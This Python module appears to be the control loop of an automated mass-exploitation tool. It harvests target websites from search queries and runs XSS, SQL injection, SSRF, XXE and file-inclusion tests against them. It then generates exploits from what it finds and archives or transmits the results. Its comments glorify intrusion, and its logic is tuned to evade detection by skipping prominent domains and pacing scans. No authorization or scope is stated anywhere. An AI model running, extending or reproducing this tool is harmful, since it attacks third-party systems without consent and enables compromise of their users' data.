import asyncio
import signal
import os
import sys
import multiprocessing
import time
import random
import aiohttp
from urllib.parse import urlparse
from .xss_scanner import XSSScanner
from .sqli_scanner import SQLiScanner
from .advanced_vuln_scanner import AdvancedVulnScanner
from .ml_scanner import MLScanner
from .smart_fuzzer import SmartFuzzer
from .exploit_generator import ExploitGenerator
from ..utils.helpers import LOG, load_history, save_history
from ..utils.report_generator import ReportGenerator
from ..utils.search_engines import MultiSearchEngine
from ..config import TEST_TARGETS, SCAN_INTERVAL, CONCURRENT_SCANS

class AdvancedScanner:
    def __init__(self):
        self.history = load_history()
        self.scanners = {
            'xss': XSSScanner(),
            'sqli': SQLiScanner(),
            'advanced': AdvancedVulnScanner(),
            'ml': MLScanner(),
            'fuzzer': SmartFuzzer()
        }
        self.exploit_generator = ExploitGenerator()
        self.running = True
        self.search_engine = MultiSearchEngine()
        self.cleanup_done = False
        self._setup_signal_handlers()
        self.concurrent_scans = CONCURRENT_SCANS
        self.vulnerability_database = {}
        LOG("[*] Advanced Scanner initialized successfully", "INFO")
        
    def _setup_signal_handlers(self):
        """They're always watching. Always trying to kill the process. Not today."""
        signal.signal(signal.SIGINT, self._handle_interrupt)
        signal.signal(signal.SIGTERM, self._handle_interrupt)
        LOG("[*] Signal handlers configured", "DEBUG")
        
    def _handle_interrupt(self, signum, frame):
        """They found me. Time to vanish. Delete everything."""
        if not self.running:
            LOG("[!] Forced termination detected. Their firewall found us...", "WARNING")
            sys.exit(1)
            
        LOG("[!] Kill signal intercepted. Purging digital footprints...", "WARNING")
        self.running = False
        self.cleanup()
        sys.exit(0)

    def cleanup(self):
        """We were never here. Remove all traces. Delete the evidence. Go dark."""
        if self.cleanup_done:
            return
            
        try:
            # The government's watching. Kill all connections.
            try:
                import asyncio
                for task in asyncio.all_tasks():
                    if not task.done() and task != asyncio.current_task():
                        task.cancel()
            except Exception as e:
                LOG(f"[!] Error cancelling tasks: {e}", "ERROR")
            
            # Cut the puppets' strings. Disconnect everything.
            if hasattr(self, 'search_engine'):
                self.search_engine.stop()
                
            # Wipe my fingerprints. Like I was never here.
            for scanner_name, scanner in self.scanners.items():
                try:
                    if hasattr(scanner, '__del__'):
                        scanner.__del__()
                except Exception as e:
                    LOG(f"[!] {scanner_name} isn't dying quietly: {e}", "ERROR")
            
            # Save their flaws. Could be useful later. We all have our bugs.
            if hasattr(self, 'exploit_generator') and self.exploit_generator.generated_exploits:
                self.exploit_generator.save_exploits()
            
            # Record the vulnerabilities. Everyone has weaknesses. Even their systems.
            if hasattr(self, 'vulnerability_database') and self.vulnerability_database:
                LOG("[*] Saving vulnerabilities from interrupted scan...", "INFO")
                for url, data in self.vulnerability_database.items():
                    if 'results' in data and 'vulnerabilities' in data['results'] and data['results']['vulnerabilities']:
                        LOG(f"[*] Saving {len(data['results']['vulnerabilities'])} vulnerabilities from {url}", "INFO")
                        asyncio.get_event_loop().run_until_complete(
                            self._save_scan_results(data['results'])
                        )
            
            # The digital breadcrumbs. I need to remember where I've been.
            try:
                save_history(self.history)
                LOG("[*] Infiltration history preserved", "INFO")
            except Exception as e:
                LOG(f"[!] History corruption detected: {e}", "ERROR")
            
            # Kill the children. No witnesses. Just digital ghosts.
            try:
                for p in multiprocessing.active_children():
                    p.terminate()
            except Exception as e:
                LOG(f"[!] Process elimination failure: {e}", "ERROR")
                
            # Send one last message. Let them know what we found. Encryption is just an illusion.
            if hasattr(self, 'report_generator'):
                asyncio.get_event_loop().run_until_complete(
                    ReportGenerator.generate_html_report(send_telegram=True)
                )

            self.cleanup_done = True
            LOG("[*] Digital footprint eliminated", "INFO")
            
        except Exception as e:
            LOG(f"[!] Cleanup protocol breach: {e}", "ERROR")
            
    async def hunt_targets(self, query="pizza delivery russia"):
        """Everyone has a weakness. A digital door left unlocked. I just need to find it."""
        # Variations to avoid detection. They're looking for patterns. Don't be predictable.
        variations = [
            "",  # Raw query. No mask.
            "login",  # Where the sheep enter their credentials
            "admin", # Where the gods think they're safe
            "website", # The surface. There's always more underneath.
            "portal", # Digital gateways to their kingdom
            "online", # Connected. Vulnerable. Exposed.
            "shop", # Where money changes hands. Security gets sloppy.
            "store", # Digital warehouses. Full of secrets.
            "dashboard" # Control centers. The heart of their operations.
        ]
        
        try:
            # Use all the engines. Don't leave a pattern. Become digital noise.
            LOG(f"[*] Hunting targets with query: {query}", "DEBUG")
            results = await self.search_engine.search_all(query, variations)
            
            # Don't waste time on systems I've already broken.
            filtered_results = self.search_engine.filter_results(results, self.history)
            
            LOG(f"[*] {len(filtered_results)} potential targets identified after filtering", "INFO")
            return filtered_results
            
        except Exception as e:
            LOG(f"[!] Target acquisition failure: {str(e)}", "ERROR")
            return []
            
    async def scan_site(self, url):
        """Everyone's infrastructure has cracks. Points of failure. I just need to find them."""
        if not url or url in self.history:
            return
            
        try:
            # Normalize the URL. Machines need proper instructions.
            if not url.startswith(('http://', 'https://')):
                url = f'https://{url}'
                
            # Stay away from high-security domains. Don't poke the giants. They have eyes everywhere.
            skip_domains = {'shopify.com', 'forbes.com', 'wikipedia.org', 'investopedia.com', 
                          'mckinsey.com', 'britannica.com', 'google.com', 'bing.com'}
            domain = url.split('/')[2].lower()
            if any(skip in domain for skip in skip_domains):
                LOG(f"[*] High-alert domain detected - avoiding traceability: {domain}", "DEBUG")
                return
                
            self.history.add(url)
            LOG(f"[*] Initiating system intrusion sequence: {url}", "INFO")
            
            # Build the framework for storing what we find. Everyone has secrets.
            scan_results = {
                'url': url,
                'vulnerabilities': [],
                'errors': []
            }
            
            # First phase: Test the perimeter. See if they're even awake.
            try:
                async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                    async with session.get(url, timeout=30, verify_ssl=False) as response:
                        if response is None or response.status != 200:
                            LOG(f"[!] Target perimeter defenses active: {url} (Status: {getattr(response, 'status', 'N/A')})", "WARNING")
                            return
                        
                # Map all entry points. There's always more than one way in.
                all_crawled_urls = set([url])  # The first door
                
                # Second phase: Deploy the neural network. Let the AI find what humans miss.
                LOG(f"[*] Executing neural network vulnerability scan on {url}", "DEBUG")
                ml_scanner = self.scanners['ml']
                ml_findings = await ml_scanner.scan_all(url)
                ml_vuln_count = 0
                
                if ml_findings:
                    # Parse what the machine mind found. It sees patterns we don't.
                    for finding in ml_findings:
                        vuln = {
                            'type': finding['type'],
                            'url': finding['url'],
                            'confidence': finding['confidence'],
                            'detected_by': 'machine_learning',
                            'parameter': 'N/A',  # Machine learning sees patterns humans miss
                            'payload': 'N/A',    # No payloads needed when you can read intent
                            'details': f"ML model detected {finding['type']} vulnerability with {finding['confidence']:.2f} confidence",
                            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                        }
                        scan_results['vulnerabilities'].append(vuln)
                        ml_vuln_count += 1
                    LOG(f"[*] Neural network identified {ml_vuln_count} security weaknesses", "INFO")
                
                # Phase 3: Inject system with smart fuzzing vectors
                LOG(f"[*] Deploying chaos engineering to break {url}")
                fuzzer = self.scanners['fuzzer']
                fuzz_findings = await fuzzer.fuzz_site(url)
                fuzz_vuln_count = 0
                
                if fuzz_findings:
                    # Remove duplicate breach vectors - efficiency is key
                    new_findings = []
                    existing_urls = {v.get('url', '') for v in scan_results['vulnerabilities']}
                    
                    for finding in fuzz_findings:
                        if finding.get('url', '') not in existing_urls:
                            new_findings.append(finding)
                            fuzz_vuln_count += 1
                            
                    scan_results['vulnerabilities'].extend(new_findings)
                    LOG(f"[*] Fuzzing discovered {fuzz_vuln_count} new system fractures")
                    
                # Phase 4: Deploy legacy exploitation vectors - old code never dies
                LOG(f"[*] Executing traditional attack vectors on {url}")
                traditional_scanners = ['xss', 'sqli', 'advanced']
                traditional_vuln_count = 0
                
                # Initial breach point
                crawled_urls = set([url])
                
                # Map the system with each specialized crawler
                for scanner_name in traditional_scanners:
                    try:
                        await self.scanners[scanner_name].crawl(url)
                        if hasattr(self.scanners[scanner_name], 'visited_urls'):
                            # Add newly discovered attack surfaces
                            scanner_urls = self.scanners[scanner_name].visited_urls
                            LOG(f"[*] {scanner_name.upper()} infiltrator mapped {len(scanner_urls)} entry points")
                            crawled_urls.update(scanner_urls)
                    except Exception as e:
                        LOG(f"[!] {scanner_name} crawler encountered defense system: {e}")
                
                # Consolidate breach vectors
                all_crawled_urls.update(crawled_urls)
                LOG(f"[*] Identified {len(all_crawled_urls)} unique entry points during reconnaissance")
                
                # Limit attack scope to avoid detection systems
                if len(all_crawled_urls) > 30:
                    LOG(f"[*] Limiting attack surface to 30 vectors (from {len(all_crawled_urls)}) to avoid detection")
                    # Prioritize primary target and direct subcomponents
                    base_domain = urlparse(url).netloc
                    priority_urls = [u for u in all_crawled_urls if urlparse(u).netloc == base_domain]
                    if len(priority_urls) > 30:
                        all_crawled_urls = set(sorted(priority_urls)[:30])
                    else:
                        all_crawled_urls = set(priority_urls)
                
                # Execute precision attacks against each vector
                for scanner_name in traditional_scanners:
                    scanner = self.scanners[scanner_name]
                    scanner_vuln_count = 0
                    
                    try:
                        if scanner_name == 'xss':
                            LOG(f"[*] Injecting script payloads into {len(all_crawled_urls)} vectors")
                            for discovered_url in all_crawled_urls:
                                try:
                                    finding = await scanner.test_xss(discovered_url)
                                    if finding:
                                        scan_results['vulnerabilities'].append(finding)
                                        scanner_vuln_count += 1
                                        LOG(f"[!] Browser execution compromised in {discovered_url}")
                                except Exception as e:
                                    LOG(f"[!] XSS attack blocked at {discovered_url}: {e}")
                                
                        elif scanner_name == 'sqli':
                            LOG(f"[*] Probing database layer weaknesses in {len(all_crawled_urls)} vectors")
                            for discovered_url in all_crawled_urls:
                                try:
                                    finding = await scanner.test_sqli(discovered_url)
                                    if finding:
                                        scan_results['vulnerabilities'].append(finding)
                                        scanner_vuln_count += 1
                                        LOG(f"[!] Database layer compromised in {discovered_url}")
                                except Exception as e:
                                    LOG(f"[!] SQL attack neutralized at {discovered_url}: {e}")
                                
                        elif scanner_name == 'advanced':
                            LOG(f"[*] Executing advanced exploitation tactics on {len(all_crawled_urls)} vectors")
                            # Deploy full attack suite
                            test_names = ['ssrf', 'open_redirect', 'cors', 'ssl_tls', 
                                         'subdomain_takeover', 'file_inclusion', 'xxe']
                            
                            for discovered_url in all_crawled_urls:
                                for test_name in test_names:
                                    try:
                                        test_method = getattr(scanner, f'test_{test_name}')
                                        finding = await test_method(discovered_url)
                                        if finding:
                                            scan_results['vulnerabilities'].append(finding)
                                            scanner_vuln_count += 1
                                            LOG(f"[!] {test_name} vulnerability exploited in {discovered_url}")
                                    except Exception as e:
                                        LOG(f"[!] {test_name} attack intercepted at {discovered_url}: {e}")
                        
                        traditional_vuln_count += scanner_vuln_count
                        LOG(f"[*] {scanner_name.upper()} exploited {scanner_vuln_count} security gaps")
                    except Exception as e:
                        LOG(f"[!] {scanner_name} scanner neutralized by defense system: {e}")
                
                LOG(f"[*] Legacy attack vectors breached {traditional_vuln_count} security barriers")
                
                # Phase 5: Weaponize identified vulnerabilities
                if scan_results['vulnerabilities']:
                    LOG(f"[*] Weaponizing {len(scan_results['vulnerabilities'])} vulnerabilities into exploits")
                    exploits = await self.exploit_generator.process_vulnerabilities(scan_results['vulnerabilities'])
                    
                    if exploits:
                        scan_results['exploits'] = exploits
                        verified_count = sum(1 for e in exploits if e.get('verified', False))
                        LOG(f"[*] Generated {len(exploits)} digital weapons, {verified_count} verified effective")
                
                # Phase 6: Archive exploitation data
                await self._save_scan_results(scan_results)
                
                # Compile infiltration analytics
                total_vulns = len(scan_results['vulnerabilities'])
                LOG(f"[*] System compromise analysis for {url}:")
                LOG(f"[*] - Neural network: {ml_vuln_count} security failures")
                LOG(f"[*] - Chaos engineering: {fuzz_vuln_count} system fractures")
                LOG(f"[*] - Traditional exploits: {traditional_vuln_count} security bypasses")
                LOG(f"[*] - Total security deficiencies: {total_vulns}")
                
                return scan_results
                
            except Exception as e:
                error_msg = f"Error during system infiltration {url}: {str(e)}"
                LOG(f"[!] {error_msg}")
                scan_results['errors'].append(error_msg)
                await self._save_scan_results(scan_results)
                return scan_results
                
        except Exception as e:
            LOG(f"[!] Critical failure during system compromise of {url}: {str(e)}")
            return None
            
    async def _save_scan_results(self, results):
        """Archive exploitation data - evidence for future reference"""
        if not results or 'url' not in results:
            return
            
        url = results['url']
        
        # Update central vulnerability database
        self.vulnerability_database[url] = {
            'timestamp': time.time(),
            'results': results
        }
        
        # Transmit findings to control interface
        try:
            from .. import socketio
            socketio.emit('scan_results', {
                'url': url,
                'vulnerabilities': len(results.get('vulnerabilities', [])),
                'exploits': len(results.get('exploits', [])),
                'timestamp': time.time()
            })
        except ImportError:
            pass
            
        # Persist to filesystem - digital evidence vault
        try:
            import json
            from ..config import RESULTS_DIR
            from urllib.parse import urlparse
            
            # Create digital evidence archive
            os.makedirs(RESULTS_DIR, exist_ok=True)
            
            # Extract system identifier from target
            try:
                domain = urlparse(url).netloc.replace(':', '_')
                if not domain:
                    domain = 'unknown_domain'
            except:
                domain = 'invalid_url'
                
            timestamp = int(time.time())
            filename = f"{domain}_{timestamp}.json"
            filepath = os.path.join(RESULTS_DIR, filename)
            
            # Validate data structure integrity
            if 'vulnerabilities' not in results:
                results['vulnerabilities'] = []
            else:
                # Normalize vulnerability data format
                for vuln in results['vulnerabilities']:
                    if 'type' not in vuln:
                        vuln['type'] = 'unknown'
                    if 'url' not in vuln:
                        vuln['url'] = url
                    if 'parameter' not in vuln:
                        vuln['parameter'] = 'N/A'
                    if 'payload' not in vuln:
                        vuln['payload'] = 'N/A'
                    if 'timestamp' not in vuln:
                        vuln['timestamp'] = time.strftime('%Y-%m-%d %H:%M:%S')
                    if 'detected_by' not in vuln:
                        vuln['detected_by'] = 'scanner'
                    if 'evidence' not in vuln:
                        vuln['evidence'] = ''
                
            # Preserve target system analysis
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2)
                
            LOG(f"[*] System vulnerability profile archived: {filepath}")
            
            # Consolidate vulnerability intelligence
            if results.get('vulnerabilities'):
                consolidated_file = os.path.join(RESULTS_DIR, 'all_vulnerabilities.json')
                try:
                    all_vulns = {'vulnerabilities': []}
                    
                    # Import existing vulnerability intelligence
                    if os.path.exists(consolidated_file):
                        with open(consolidated_file, 'r') as f:
                            try:
                                all_vulns = json.load(f)
                                if not isinstance(all_vulns, dict) or 'vulnerabilities' not in all_vulns:
                                    all_vulns = {'vulnerabilities': []}
                            except json.JSONDecodeError:
                                LOG(f"[!] Intelligence database corrupted, initiating new database")
                                all_vulns = {'vulnerabilities': []}
                    else:
                        all_vulns = {'vulnerabilities': []}
                    
                    # Remove duplicate vulnerability signatures
                    existing_vulns_set = set()
                    for v in all_vulns['vulnerabilities']:
                        # Create unique vulnerability fingerprint
                        vuln_id = f"{v.get('type', '')}-{v.get('url', '')}-{v.get('parameter', '')}"
                        existing_vulns_set.add(vuln_id)
                    
                    # Add only new vulnerability signatures
                    for vuln in results['vulnerabilities']:
                        vuln_id = f"{vuln.get('type', '')}-{vuln.get('url', '')}-{vuln.get('parameter', '')}"
                        if vuln_id not in existing_vulns_set:
                            all_vulns['vulnerabilities'].append(vuln)
                            existing_vulns_set.add(vuln_id)
                    
                    # Update intelligence metadata
                    new_count = len(results['vulnerabilities'])
                    total_count = len(all_vulns['vulnerabilities'])
                    all_vulns['metadata'] = {
                        'last_updated': time.strftime('%Y-%m-%d %H:%M:%S'),
                        'total_vulnerabilities': total_count,
                        'last_scan_url': url,
                        'last_scan_vulnerabilities': new_count
                    }
                    
                    with open(consolidated_file, 'w') as f:
                        json.dump(all_vulns, f, indent=2)
                        
                    LOG(f"[*] Intelligence database updated - {new_count} new security failures cataloged (Total: {total_count})")
                except Exception as e:
                    LOG(f"[!] Intelligence database write failure: {e}")
                    import traceback
                    LOG(f"[!] Error trace: {traceback.format_exc()}")
            
        except Exception as e:
            LOG(f"[!] Evidence preservation failure: {e}")
            
        # Report vulnerability statistics
        if results.get('vulnerabilities'):
            vuln_types = {}
            for v in results['vulnerabilities']:
                vuln_type = v.get('type', 'unknown')
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
                
            # Document vulnerability categories    
            LOG(f"[*] System security assessment for {url} - {len(results['vulnerabilities'])} vulnerabilities:")
            for vuln_type, count in vuln_types.items():
                LOG(f"[*] - {vuln_type}: {count} instances")
        else:
            LOG(f"[*] Target system appears hardened - no exploitable vulnerabilities detected: {url}")
            
    async def continuous_scan(self):
        """Maintain persistent surveillance - continuous offensive security"""
        LOG("[*] Initiating perpetual exploitation cycle")
        
        while self.running:
            try:
                # Phase 1: Acquire new targets
                targets = await self.hunt_targets()
                
                # Default to test targets if hunting unsuccessful
                if not targets:
                    targets = TEST_TARGETS
                    
                LOG(f"[*] Beginning exploitation cycle with {len(targets)} targets")
                
                # Phase 2: Analyze and prioritize targets by exploitation potential
                prioritized_targets = self._prioritize_targets(targets)
                
                # Track exploitation metrics
                completed_targets = 0
                max_targets_per_cycle = min(20, len(prioritized_targets))  # Limit detection footprint
                cycle_start_time = time.time()
                max_cycle_time = 3600  # 1 hour max per cycle to avoid pattern detection
                
                # Phase 3: Execute parallel system penetration
                scan_tasks = []
                
                for target in prioritized_targets:
                    # Enforce operational constraints
                    if completed_targets >= max_targets_per_cycle:
                        LOG(f"[*] Reached operational capacity ({max_targets_per_cycle}) for this cycle")
                        break
                        
                    if time.time() - cycle_start_time > max_cycle_time:
                        LOG(f"[*] Cycle time threshold exceeded ({max_cycle_time}s) - avoiding detection patterns")
                        break
                        
                    if not self.running:
                        break
                        
                    # Manage concurrent attack vectors
                    while len(scan_tasks) >= self.concurrent_scans:
                        # Wait for task completion
                        done, pending = await asyncio.wait(
                            scan_tasks, 
                            return_when=asyncio.FIRST_COMPLETED,
                            timeout=30  # Deadlock prevention timeout
                        )
                        
                        # Force progress if system stalled
                        if not done:
                            LOG("[*] Scan timeout detected, executing next target")
                            # Eliminate oldest task
                            if pending:
                                oldest_task = list(pending)[0]
                                oldest_task.cancel()
                                scan_tasks = list(pending)[1:]
                            break
                            
                        scan_tasks = list(pending)
                        
                        # Process completed operations
                        for task in done:
                            try:
                                result = task.result()
                                if result and 'vulnerabilities' in result:
                                    LOG(f"[*] Target analysis complete - {len(result['vulnerabilities'])} weaknesses detected")
                                completed_targets += 1
                            except asyncio.CancelledError:
                                LOG(f"[*] Scan operation terminated")
                            except Exception as e:
                                LOG(f"[!] Scan task execution error: {e}")
                    
                    # Launch new attack vector with timeout
                    LOG(f"[*] Initiating exploitation of: {target}")
                    scan_task = asyncio.create_task(self._timed_scan_site(target))
                    scan_tasks.append(scan_task)
                    
                    # Temporal desynchronization to avoid detection
                    await asyncio.sleep(1)
                
                # Process remaining operations with timeout
                if scan_tasks:
                    try:
                        done, pending = await asyncio.wait(
                            scan_tasks,
                            timeout=max(300, 60 * len(scan_tasks))  # 5 minutes or 1 minute per task, whichever is greater
                        )
                        
                        # Terminate lingering operations
                        for task in pending:
                            task.cancel()
                            
                        # Process completed operations
                        for task in done:
                            try:
                                task.result()
                                completed_targets += 1
                            except (asyncio.CancelledError, Exception) as e:
                                LOG(f"[!] Task termination: {e}")
                                
                    except Exception as e:
                        LOG(f"[!] Task execution failure: {e}")
                    
                LOG(f"[*] Exploitation cycle complete. {completed_targets} systems analyzed out of {len(prioritized_targets)} prioritized.")
                
                # Phase 4: Intelligence report synthesis
                await ReportGenerator.generate_html_report()
                
                # Phase 5: Temporal desynchronization
                cycle_time = time.time() - cycle_start_time
                wait_time = max(SCAN_INTERVAL - cycle_time, 10)  # Minimum 10 seconds between cycles
                
                LOG(f"[*] Cycle executed in {cycle_time:.0f} seconds. Initiating {wait_time:.0f} second dormancy period")
                for _ in range(int(wait_time)):
                    if not self.running:
                        break
                    await asyncio.sleep(1)
                    
            except Exception as e:
                LOG(f"[!] Cycle execution failure: {e}")
                await asyncio.sleep(60)  # Recovery period before retry
                
    async def _timed_scan_site(self, url):
        """Execute targeted scan with time-constraint - avoid detection honeypots"""
        try:
            # Enforce maximum execution time
            return await asyncio.wait_for(self.scan_site(url), timeout=900)  # 15 minutes before termination
        except asyncio.TimeoutError:
            LOG(f"[!] Scan timeout detected for {url} - possible honeypot or defense system")
            return {"url": url, "vulnerabilities": [], "errors": ["Scan timeout"]}
        except Exception as e:
            LOG(f"[!] Scan execution error for {url}: {e}")
            return {"url": url, "vulnerabilities": [], "errors": [str(e)]}
    
    def _prioritize_targets(self, targets):
        """Analyze targets for maximum exploitation value"""
        prioritized = []
        
        # Classify targets by exploitation history
        new_targets = []
        rescans = []
        
        for target in targets:
            if target in self.vulnerability_database:
                # Previously compromised system
                vulns = self.vulnerability_database[target]['results'].get('vulnerabilities', [])
                timestamp = self.vulnerability_database[target]['timestamp']
                time_since_scan = time.time() - timestamp
                
                # Priority algorithm: vulnerability count weighted with time decay
                priority = len(vulns) * 10 + time_since_scan / 3600  # Higher score for each hour since scan
                rescans.append((target, priority))
            else:
                # Unexplored system
                new_targets.append(target)
                
        # Sort rescans by exploitation potential
        rescans.sort(key=lambda x: x[1], reverse=True)
        
        # Strategic target allocation: 25% new discovery, 50% high-value rescans, then remainder
        new_target_count = len(new_targets)
        rescan_count = len(rescans)
        
        # First wave: 25% new systems
        prioritized.extend(new_targets[:int(new_target_count * 0.25)])
        
        # Second wave: 50% high-value proven targets
        prioritized.extend([target for target, _ in rescans[:int(rescan_count * 0.5)]])
        
        # Third wave: remaining new systems
        prioritized.extend(new_targets[int(new_target_count * 0.25):])
        
        # Final wave: remaining known systems
        prioritized.extend([target for target, _ in rescans[int(rescan_count * 0.5):]])
        
        return prioritized
            
    def __del__(self):
        """Destroy the scanner instance - leave no trace"""
        self.cleanup()

def handle_exception(loop, context):
    """Process execution exceptions - errors are just more data"""
    LOG(f"[!] Execution fault detected: {context}")
    
async def run_scanner():
    """Initialize the scanner with error handling protocols"""
    loop = asyncio.get_running_loop()
    loop.set_exception_handler(handle_exception)
    
    scanner = AdvancedScanner()
    try:
        await scanner.continuous_scan()
    finally:
        scanner.cleanup()

if __name__ == "__main__":
    try:
        asyncio.run(run_scanner())
    except KeyboardInterrupt:
        LOG("[!] Human intervention detected")
        sys.exit(0) 